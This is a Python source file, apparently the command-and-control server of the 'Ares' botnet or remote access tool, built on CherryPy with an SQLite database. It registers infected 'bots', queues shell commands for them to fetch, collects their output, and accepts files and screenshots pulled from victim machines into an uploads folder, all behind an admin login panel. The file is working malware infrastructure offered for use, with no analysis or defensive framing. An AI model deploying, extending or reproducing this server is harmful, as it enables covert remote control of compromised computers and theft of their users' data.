import cherrypy
import sqlite3
import time
import os
import re
import random
import string
import hashlib


UPLOAD_DIR = os.path.join(os.path.dirname(os.path.realpath(__file__)), "uploads")
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)
COOKIE_NAME = "ARESSESSID"
SESSION_TIMEOUT = 300


pending_uploads = []
session_cookie = None
last_session_activity = 0
app = None

html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
    ">": "&gt;",
    "<": "&lt;",
}


def html_escape(text):
    return "".join(html_escape_table.get(c,c) for c in text)


def validate_botid(candidate):
    return re.match('^[a-zA-Z0-9\s\-_]+$', candidate) is not None


def query_DB(sql, params=()):
    conn = sqlite3.connect('beta.db')
    cursor = conn.cursor()
    result = []
    for row in cursor.execute(sql, params):
        result.append(row)
    conn.close()
    return result


def exec_DB(sql, params=()):
    conn = sqlite3.connect('beta.db')
    cursor = conn.cursor()
    cursor.execute(sql, params)
    conn.commit()
    conn.close()


def get_admin_password():
    result = query_DB("SELECT password FROM users WHERE name='admin'")
    if result:
        return result[0][0]
    else:
        return None


def set_admin_password(admin_password):
    password_hash = hashlib.sha256()
    password_hash.update(admin_password)
    exec_DB("DELETE FROM users WHERE name='admin'")
    exec_DB("INSERT INTO users VALUES (?, ?, ?)", (None, "admin", password_hash.hexdigest()))


def require_admin(func):
    def wrapper(*args, **kwargs):
        global session_cookie
        global last_session_activity
        global SESSION_TIMEOUT
        if session_cookie and COOKIE_NAME in cherrypy.request.cookie and session_cookie == cherrypy.request.cookie[COOKIE_NAME].value:
            if time.time() - last_session_activity > SESSION_TIMEOUT:
                raise cherrypy.HTTPRedirect("/disconnect")
            else:
                last_session_activity = time.time()
                return func(*args, **kwargs)
        else:
            raise cherrypy.HTTPRedirect("/login")
    return wrapper


class Main(object):
    @cherrypy.expose
    @require_admin
    def index(self):
        with open("Menu.html", "r") as f:
            html = f.read()
            return html

    @cherrypy.expose
    def login(self, password=''):
        admin_password = get_admin_password()
        if not admin_password:
            if password:
                set_admin_password(password)
                return 'Admin password set successfully. <a href="./login">Click here to login</a>'
            else:
                with open("CreatePassword.html", "r") as f:
                    html = f.read()
                    return html
        else:
            password_hash = hashlib.sha256()
            password_hash.update(password)
            if password_hash.hexdigest() == get_admin_password():
                global session_cookie
                session_cookie = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(64))
                cherrypy.response.cookie[COOKIE_NAME] = session_cookie
                global last_session_activity
                last_session_activity = time.time()
                raise cherrypy.HTTPRedirect('/')
            else:
                with open("Login.html", "r") as f:
                    html = f.read()
                    return html

    @cherrypy.expose
    def disconnect(self):
        session_cookie = None
        cherrypy.response.cookie[COOKIE_NAME] = ''
        cherrypy.response.cookie[COOKIE_NAME]['expires'] = 0
        return 'You have been disconnected. <a href="./login">Click here to login</a>'

    @cherrypy.expose
    @require_admin
    def passchange(self, password=''):
        if password:
                set_admin_password(password)
                return 'Admin password changed successfully. <a href="./login">Click here to login</a>'
        else:
            with open("CreatePassword.html", "r") as f:
                html = f.read()
                return html


class CNC(object):
    @cherrypy.expose
    @require_admin
    def index(self):
        bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
        output = ""
        for bot in bot_list:
            output += '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>' % (bot[0], bot[0], "Online" if time.time() - 30 < bot[1] else time.ctime(bot[1]), bot[2], bot[3],
                bot[0])
        with open("List.html", "r") as f:
            html = f.read()
            html = html.replace("{{bot_table}}", output)
            return html

    @cherrypy.expose
    @require_admin
    def bot(self, botid):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        with open("Bot.html", "r") as f:
            html = f.read()
            html = html.replace("{{botid}}", botid)
            return html
    

class API(object):
    @cherrypy.expose
    def pop(self, botid, sysinfo):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
        if not bot:
            exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (html_escape(botid), time.time(), html_escape(cherrypy.request.headers["X-Forwarded-For"]) if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, html_escape(sysinfo)))
        else:
            exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
        cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
        if cmd:
            exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
            exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), "&gt; " + cmd[0][2], html_escape(botid)))
            return cmd[0][2]
        else:
            return ""

    @cherrypy.expose
    def report(self, botid, output):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), html_escape(output), html_escape(botid)))

    @cherrypy.expose
    @require_admin
    def push(self, botid, cmd):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))
        if cmd.startswith("upload "):
            pending_uploads.append(cmd.split("upload ")[1])
        if cmd.startswith("screenshot"):
            pending_uploads.append("screenshot")

    @cherrypy.expose
    @require_admin
    def stdout(self, botid):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        output = ""
        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC', (botid,))
        for entry in reversed(bot_output):
            output += "%s\n\n" % entry[2]
        bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
        for entry in bot_queue:
            output += "> %s [PENDING...]\n\n" % entry[2]
        return output

    @cherrypy.expose
    def uploadpsh(self, botid, src, file):
        self.upload(botid, src, file)

    @cherrypy.expose
    def upload(self, botid, src, uploaded):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        up_dir = os.path.join(UPLOAD_DIR, botid)
        if not os.path.exists(up_dir):
            os.makedirs(up_dir)
        expected_file = src
        if expected_file not in pending_uploads and src.endswith(".zip"):
            expected_file = src.split(".zip")[0]
        if expected_file in pending_uploads:
            pending_uploads.remove(expected_file)
        elif "screenshot" in pending_uploads:
            pending_uploads.remove("screenshot")
        else:
            print "Unexpected file: %s" % src
            raise cherrypy.HTTPError(403)
        while os.path.exists(os.path.join(up_dir, src)):
            src = "_" + src
        save_path = os.path.join(up_dir, src)
        outfile = open(save_path, 'wb')
        while True:
            data = uploaded.file.read(8192)
            if not data:
                break
            outfile.write(data)
        outfile.close()
        up_url = "../uploads/" +  html_escape(botid) + "/" + html_escape(src)
        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), 'Uploaded: <a href="' + up_url + '">' + up_url + '</a>', html_escape(botid)))


def main():
    global app
    config = {'global': {'server.socket_host': '127.0.0.1',
                'server.socket_port': 8080,
                'environment': 'production',
                },
                '/': {  
                    'response.headers.server': "Ares",
                },
                '/static': {
                    'tools.staticdir.on': True,
                    'tools.staticdir.dir':  os.path.join(os.path.dirname(os.path.realpath(__file__)), "static")
                },
                '/uploads': {
                    'tools.staticdir.on': True,
                    'tools.staticdir.dir':  UPLOAD_DIR
                },
               }
    app = Main()
    app.api = API()
    app.cnc = CNC()
    print "[*] Server started on %s:%s" % (config["global"]["server.socket_host"], config["global"]["server.socket_port"])
    cherrypy.quickstart(app, config=config)


if __name__ == "__main__":
    main()
